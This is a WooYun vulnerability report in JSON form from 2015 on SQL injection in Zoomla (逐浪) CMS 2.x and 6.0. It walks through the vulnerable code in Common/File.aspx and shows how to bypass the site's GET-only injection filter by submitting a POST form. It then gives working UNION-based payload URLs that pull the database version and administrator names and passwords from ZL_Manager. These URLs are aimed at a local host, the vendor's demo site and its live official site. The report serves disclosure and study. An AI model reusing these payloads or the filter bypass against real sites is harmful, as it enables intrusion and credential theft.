{"id": 23989, "wybug_id": "wooyun-2015-0120000", "wybug_title": "逐浪CMS注入影响CMS2全系列和CMS6.0版本以及影响官网(无需登陆)", "wybug_corp": "逐浪CMS", "wybug_author": "Damo", "wybug_date": "2015-06-15 10:13", "wybug_open_date": "2015-09-18 10:15", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向公众公开  简要描述： 影响一下版本Zoomla!CMS2_x1.5Zoomla!CMS2_x2.0Zoomla!CMS2_x2.1Zoomla!CMS2_x2.2Zoomla!CMS2_x2.3Zoomla!CMS2_x2.4Zoomla!CMS6.0其他版本（未测试） 详细说明：  影响版本\n\n详细分析如下：问题文件：\\Common\\file.aspx注：此问题文件包含两个注入参数:code代码分析如下：\nprotected void Page_Load(object sender, EventArgs e)\t{\t\tstring str = \"http://\" + HttpContext.Current.Request.Url.Authority.ToString() + \"/UploadFiles/\" + this.ull.GetLogin(true).UserName;\t\tif (base.Request.QueryString[\"code\"] == null && base.Request.QueryString[\"FD\"] != null)\t\t{\t\t\tif (base.Request.QueryString[\"ur\"] == null && base.Request.QueryString[\"state\"] == null)\t\t\t{\t\t\t\tstring value = base.Server.UrlDecode(base.Request.QueryString[\"FD\"]);\t\t\t\tthis.FileUrl = this.FileJiema(value);\t\t\t\tthis.hid.Value = base.Server.UrlDecode(base.Request.QueryString[\"FD\"]);\t\t\t}\t\t\telse\t\t\t{\t\t\t\tif (base.Request.QueryString[\"state\"] == null)\t\t\t\t{\t\t\t\t\tstring value2 = base.Request.QueryString[\"FD\"].ToString().Replace(\" \", \"+\");\t\t\t\t\tthis.FileUrl = this.FileJiema(value2);\t\t\t\t\tthis.hid.Value = value2;\t\t\t\t}\t\t\t}\t\t\tif (base.Request[\"state\"] != null && base.Request[\"state\"] == \"tr\")\t\t\t{\t\t\t\tstring value3 = base.Request.QueryString[\"FD\"];/*第一种注入：带sql的Base64字符串*/\t\t\t\tthis.FileUrl = this.FileJiema(value3);/*第一种注入：解码字符串FromBase64String(value));*/\t\t\t\tthis.hid.Value = value3;\t\t\t\tthis.file = this.bfile.SelectFile(string.Concat(new object[]\t\t\t\t{\t\t\t\t\t\" FileName='\",\t\t\t\t\tthis.FileUrl,\t\t\t\t\t\"' and userid=\",\t\t\t\t\tthis.ull.GetLogin(true).UserID\t\t\t\t}));/*第一种注入：this.bfile.SelectFile会直接代入sql注入*/\t\t\t\tif (this.file.DownUrl == null)\t\t\t\t{\t\t\t\t\tbase.Response.Write(\"0\");\t\t\t\t\tbase.Response.End();\t\t\t\t\treturn;\t\t\t\t}\t\t\t\tbase.Response.Write(\"http://\" + HttpContext.Current.Request.Url.Authority.ToString() + \"/Common/File.aspx?code=\" + this.file.ExtractionCode);\t\t\t\tbase.Response.End();\t\t\t\treturn;\t\t\t}\t\t\telse\t\t\t{\t\t\t\tif (base.Request.QueryString[\"ur\"] != null)\t\t\t\t{\t\t\t\t\tthis.file.ExtractionCode = function.GetRandomString(8, 1);\t\t\t\t\tthis.file.DownUrl = str + this.FileUrl;\t\t\t\t\tthis.file.State = 1;\t\t\t\t\tthis.file.UserID = this.ull.GetLogin(true).UserID;\t\t\t\t\tthis.file.FileName = this.FileUrl;\t\t\t\t\tthis.bfile.AddFile(this.file);\t\t\t\t\tbase.Response.Write(\"http://\" + HttpContext.Current.Request.Url.Authority.ToString() + \"/Common/File.aspx?code=\" + this.file.ExtractionCode);\t\t\t\t\tbase.Response.End();\t\t\t\t\treturn;\t\t\t\t}\t\t\t}\t\t}\t\telse\t\t{\t\t\t/*第二种注入：比较简单 直接代入code参数*/\t\t\tif (base.Request.QueryString[\"code\"] != \"\" && base.Request.QueryString[\"code\"] != null)\t\t\t{\t\t\t\tthis.file = this.bfile.SelectFile(\" ExtractionCode='\" + base.Request.QueryString[\"code\"] + \"' \");\t\t\t\tbase.Response.Redirect(this.file.DownUrl);/*然后跳转URL   URL中不能包含换行符 所以我这里采用截取的方式以及拼接的方式*/\t\t\t}\t\t}\t}this.bfile.SelectFile方法代码如下：public M_File SelectFile(string where){\tif (where == \"\")\t{\t\tthis.sql = \"select * from ZL_File\";\t}\telse\t{\t\tthis.sql = \"select * from ZL_File where \" + where;/*直接将条件带入 导入SQL注入 */\t}\t略...}\n那么我们可以构造利用代码如下：本地：http://192.168.1.100:8087/Common/File.aspx?code='但是这个时候访问会被sql注入拦截那么我们看global中的拦截代码：\nprivate void Application_BeginRequest(object sender, EventArgs e)\t\t{\t\t\tif (base.Request.RequestType.ToUpper() == \"GET\" && ZoomlaSecurityCenter.GetData())\t\t\t{\t\t\t\tfunction.WriteMessage(\"产生错误的可能原因：你提交的参数不正确,包含恶意字符串,或检查系统是否开启了SQL防注入功能!\", \"\", \"非法SQL注入或存储!\");\t\t\t}\t\t\tif (base.Request.HttpMethod.ToUpper() == \"POST\" && HttpContext.Current.Request.Files.Count > 0)/*我可以在这里通过post提交方式即可绕过*/\t\t\t{\t\t\t\tZoomlaSecurityCenter.CheckUpladFiles();\t\t\t}\t\t}\n综合上面分析我采用下面的方式绕过以及注入建立一个form表单代码如下：\n<form id=\"form1\"   action=\"注入地址\" method=\"post\">          <input type=\"submit\"  value=\"逐浪CMS 注入\" />           </form>\n将下面的URL填写到form中action中即可1本地构造注入URL1.1 获取版权 注：注入后会base.Response.Redirect(this.file.DownUrl)跳转地址 跳转URL中不能包含换行符 所以我这里采用截取的方式以及拼接的方式  http://192.168.1.100:8087/Common/File.aspx?code='union select null,1,SUBSTRING (@@VERSION,0,30),null,null,1,null--\n\n1.2 获取管理员 http://192.168.1.100:8087/Common/File.aspx?code='union select null,1,STUFF(AdminPassword,1,0,AdminName),null,null,1,null from ZL_Manager--\n\n2官方demo  2.1 获取版权 注：注入后会base.Response.Redirect(this.file.DownUrl)跳转地址 跳转URL中不能包含换行符 所以我这里采用截取的方式以及拼接的方式  http://demo.zoomla.cn/Common/File.aspx?code='union select null,1,SUBSTRING (@@VERSION,0,30),null,null,1,null--2.2 获取管理员 http://demo.zoomla.cn/Common/File.aspx?code='union select null,1,STUFF(AdminPassword,1,0,AdminName),null,null,1,null from ZL_Manager--\n\n   漏洞证明：  3官方网  3.1 获取版权 注：注入后会base.Response.Redirect(this.file.DownUrl)跳转地址 跳转URL中不能包含换行符 所以我这里采用截取的方式以及拼接的方式  http://www.zoomla.cn/Common/File.aspx?code='union select null,1,SUBSTRING (@@VERSION,0,30),null,null,1,null--\n\n3.2 获取管理员 http://www.zoomla.cn/Common/File.aspx?code='union select null,1,STUFF(AdminPassword,1,0,AdminName),null,null,1,null from ZL_Manager--\n\n案例：更多案例请看官网中的“成功案例”http://www.zoomla.cn/case/   修复方案：     这个修复可能简单，但是原先发布出去的怎么办？   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-18 10:15 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}